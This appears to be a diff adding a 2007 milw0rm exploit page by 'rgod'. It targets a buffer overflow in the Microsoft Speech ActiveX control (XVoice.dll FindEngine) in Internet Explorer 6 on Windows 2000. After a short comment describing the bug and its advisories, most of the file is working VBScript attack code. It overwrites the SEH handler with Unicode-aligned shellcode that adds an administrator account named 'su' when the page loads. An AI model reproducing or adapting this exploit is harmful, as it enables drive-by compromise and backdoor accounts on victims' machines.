@@ -1,0 +1,109 @@
+<!--
+01/06/2007 23.19.50
+Microsoft Windows DirectSpeechSynthesis Module (XVoice.dll)
+/ DirectSpeechRecognition Module (Xlisten.dll)
+remote buffer overflow exploit / 2k sp4 seh version
+
+both the dlls are located in %SystemRoot%\speech folder
+and they are vulnerable to the same issue.
+while on 2k it depends on activex settings, under xp they are both
+set to "safe for a trusted caller", i.e. Internet Explorer
+
+registers after that some chars are passed to ModeName argument
+of FindEgine method and seh handler is overwritten:
+
+EAX 00000000
+ECX 00000000
+EDX 02770608
+EBX 6535F590 XVoice.6535F590
+ESP 0012DBB8 UNICODE "AAAA...
+EBP 00410041 IEXPLORE.00410041
+ESI 001921BC
+EDI 0012DBF8 UNICODE "AAAA...
+EIP 00410041 IEXPLORE.00410041
+
+I succesfully run this code on win2k, patching the shellcode
+with the venetian technique, adding an Administrator account,
+against IE6.
+Under xp, with predefined settings, Internet Explorer immediately crashes
+without warning the user first, and it's still possible running arbitrary
+code, it depends on jumpable Unicode addresses loaded in memory
+
+by A. Micalizzi (aka rgod)
+site: retrogod.altervista.org
+
+***note: this was indipendently discovered by me and Will Dormann during the
+same period, documented here:
+
+http://www.kb.cert.org/vuls/id/507433
+http://www.microsoft.com/technet/security/Bulletin/MS07-033.mspx
+
+the affected package,
+http://www.microsoft.com/speech/AppHelp(SAPI4)/sapi4.asp
+
+is still distributed with the kill bit not set
+
+-->
+
+<html>
+<object classid='clsid:EEE78591-FE22-11D0-8BEF-0060081841DE' id='DirectSS'></OBJECT>
+<script language='vbscript'>
+
+targetFile = "C:\WINNT\speech\XVoice.dll"
+memberName = "FindEngine"
+progid     = "ACTIVEVOICEPROJECTLib.DirectSS"
+argCount   = 28
+
+REM metasploit one, JmpCallAddtive, add a user 'su' with pass 'p'
+scode_fragment = unescape("%6E%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%06%90%90%90%90%90%90%90%fc%e4%22%eb%5e%31%ad%c3%c0%f7%e8%ff%ff%af%1a%30%5f%bb%5a%bd%ee%a5%ae%d4%19%e3%9b%3a%05%b9%42%03%a7%41%4c%11%a9%7c%ee%7f%77%8c%f3%90%e8%b4%ef%4c%d4%8c%d4%99%e4%5d%08%1e%9a%82%17%b3%21%43%31%44%5a%1b%6d%f5%69%39%d9%c4%38%50%43%af%44%cc%df%76%7a%57%a5%c2%85%7e%b7%f3%18%d3%39%70%9f%16%94%aa%37%5f%c5%ea%0a%70%23%10%c0%83%47%37%eb%97%6a%b3%6c%3c%6c")
+
+nop1  = unescape("%01%6E%40%6E%40%6E%40%6E%40%6E%40%6E%40%6E%40")
+c1    = unescape("%6E") : REM add byte ptr esi, ch (as nop)
+c2    = unescape("%40%6E%40%6E%40%6E%40%6E%40%6E%40%6E%40%6E%40%6E%97%6E%40") : REM xchg eax, edi
+c3    = unescape("%6E%40%6E%05%18%09") : REM add eax
+c4    = unescape("%6E%40%6E%2d%11%09") : REM sub eax
+c5    = unescape("%6E%80%90%6E%40%6E%40") : REM add byte ptr eax 90, inc eax twice
+
+code  = nop1 & c1 & c2 & c3 & c4 & c5 & _
+unescape("%6E%80%90%6E%40%6E%40%6E%80%90%6E%40%6E%40%6E%80%90%6E%40%6E%40%6E%80%90%6E%40%6E%40%6E%80%90%6E%40%6E%40%6E%80%90%6E%40%6E%40%6E%80%90%6E%40%6E%40%6e%80%bb%6e%40%6e%40%6e%80%47%6e%40%6e%40%6e%80%1a%6e%40%6e%40%6e%80%0c%6e%40%6e%40%6e%80%56%6e%40%6e%40%6e%80%1e%6e%40%6e%40%6e%80%01%6e%40%6e%40%6e%80%85%6e%40%6e%40%6e%80%75%6e%40%6e%40%6e%80%c3%6e%40%6e%40%6e%80%ef%6e%40%6e%40%6e%80%ff%6e%40%6e%40%6e%80%18%6e%40%6e%40%6e%80%66%6e%40%6e%40%6e%80%e0%6e%40%6e%40%6e%80%ec%6e%40%6e%40%6e%80%dc%6e%40%6e%40%6e%80%8e%6e%40%6e%40%6e%80%64%6e%40%6e%40%6e%80%81%6e%40%6e%40%6e%80%db%6e%40%6e%40%6e%80%d6%6e%40%6e%40%6e%80%c3%6e%40%6e%40%6e%80%03%6e%40%6e%40%6e%80%88%6e%40%6e%40%6e%80%58%6e%40%6e%40%6e%80%60%6e%40%6e%40%6e%80%9f%6e%40%6e%40%6e%80%d0%6e%40%6e%40%6e%80%df%6e%40%6e%40%6e%80%2f%6e%40%6e%40%6e%80%15%6e%40%6e%40%6e%80%2e%6e%40%6e%40%6e%80%41%6e%40%6e%40%6e%80%0b%6e%40%6e%40%6e%80%b2%6e%40%6e%40%6e%80%1e%6e%40%6e%40%6e%80%31%6e%40%6e%40%6e%80%c4%6e%40%6e%40%6e%80%ad%6e%40%6e%40%6e%80%8f%6e%40%6e%40%6e%80%7a%6e%40%6e%40%6e%80%d0%6e%40%6e%40%6e%80%7d%6e%40%6e%40%6e%80%65%6e%40%6e%40%6e%80%f6%6e%40%6e%40%6e%80%92%6e%40%6e%40%6e%80%54%6e%40%6e%40%6e%80%60%6e%40%6e%40%6e%80%54%6e%40%6e%40%6e%80%0c%6e%40%6e%40%6e%80%d7%6e%40%6e%40%6e%80%49%6e%40%6e%40%6e%80%af%6e%40%6e%40%6e%80%da%6e%40%6e%40%6e%80%5c%6e%40%6e%40%6e%80%ac%6e%40%6e%40%6e%80%f1%6e%40%6e%40%6e%80%24%6e%40%6e%40%6e%80%e2%6e%40%6e%40%6e%80%3f%6e%40%6e%40%6e%80%44%6e%40%6e%40%6e%80%3f%6e%40%6e%40%6e%80%2e%6e%40%6e%40%6e%80%03%6e%40%6e%40%6e%80%01%6e%40%6e%40%6e%80%1b%6e%40%6e%40%6e%80%e8%6e%40%6e%40%6e%80%58%6e%40%6e%40%6e%80%91%6e%40%6e%40%6e%80%36%6e%40%6e%40%6e%80%be%6e%40%6e%40%6e%80%b5%6e%40%6e%40%6e%80%a7%6e%40%6e%40%6e%80%b3%6e%40%6e%40%6e%80%80%6e%40%6e%40%6e%80%24%6e%40%6e%40%6e%80%43%6e%40%6e%40%6e%80%84%6e%40%6e%40%6e%80%e4%6e%40%6e%40%6e%80%f8%6e%40%6e%40%6e%80%77%6e%40%6e%40%6e%80%96%6e%40%6e%40%6e%80%03%6e%40%6e%40%6e%80%13%6e%40%6e%40%6e%80%89%6e%40%6e%40%6e%80%fb%6e%40%6e%40%6e%80%24%6e%40%6e%40%6e%80%8b%6e%40%6e%40%6e%80%e9%6e%40%6e%40%6e%80%0f%6e%40%6e%40%6e%80%d6%6e%40%6e%40%6e%80%ef%6e%40%6e%40%6e%80%73%6e%40%6e%40%6e%80%cf%6e%40%6e%40%6e%80%14%6e%40%6e%40%6e%80%6e%6e%40%6e%40%6e%80%8c%6e%40%6e%40%6e%80%1f%6e%40%6e%40%6e%80%22%6e%40%6e%40%6e%80%9e%6e%40%6e%40%6e%80%ae%6e%40%6e%40%6e%80%4e%6e%40%6e%40%6e%80%43%6e%40%6e%40%6e%80%fc%6e%40%6e%40%6e%80%d7%6e%40%6e%40%6e%80%72%6e%40%6e%40%6e%80%38%6e%40%6e%40%6e%80%07%6e%40%6e%40%6e%80%17%6e%40%6e%40%6e%80%83%6e%40%6e%40%6e%80%67%6e%40%6e%40%6e%80%4b%6e%40%6e%40%6e%80%68%6e%40%6e%40")
+
+seh_handler=unescape("%23%7d") : REM 0x007d0023 call edi, found with msfpescan
+eax = unescape("%01%12") : REM fix eax register, we fall in a more convenient condition
+
+suntzu = String(950, "A") + eax + seh_handler + code + scode_fragment
+
+EngineID="default"
+MfgName="default"
+ProductName="default"
+ModeID="default"
+ModeName= suntzu
+LanguageID=1
+Dialect="default"
+Speaker="default"
+Style="default"
+Gender=1
+Age=1
+Features=1
+Interfaces=1
+EngineFeatures=1
+RankEngineID=1
+RankMfgName=1
+RankProductName=1
+RankModeID=1
+RankModeName=1
+RankLanguage=1
+RankDialect=1
+RankSpeaker=1
+RankStyle=1
+RankGender=1
+RankAge=1
+RankFeatures=1
+RankInterfaces=1
+RankEngineFeatures=1
+
+DirectSS.FindEngine EngineID, MfgName, ProductName, ModeID, ModeName, LanguageID, Dialect, Speaker, Style, Gender, Age, Features, Interfaces, EngineFeatures, RankEngineID, RankMfgName, RankProductName, RankModeID, RankModeName, RankLanguage, RankDialect, RankSpeaker, RankStyle, RankGender, RankAge, RankFeatures, RankInterfaces, RankEngineFeatures
+
+</script>
+</html>
+
+# milw0rm.com [2007-06-13]
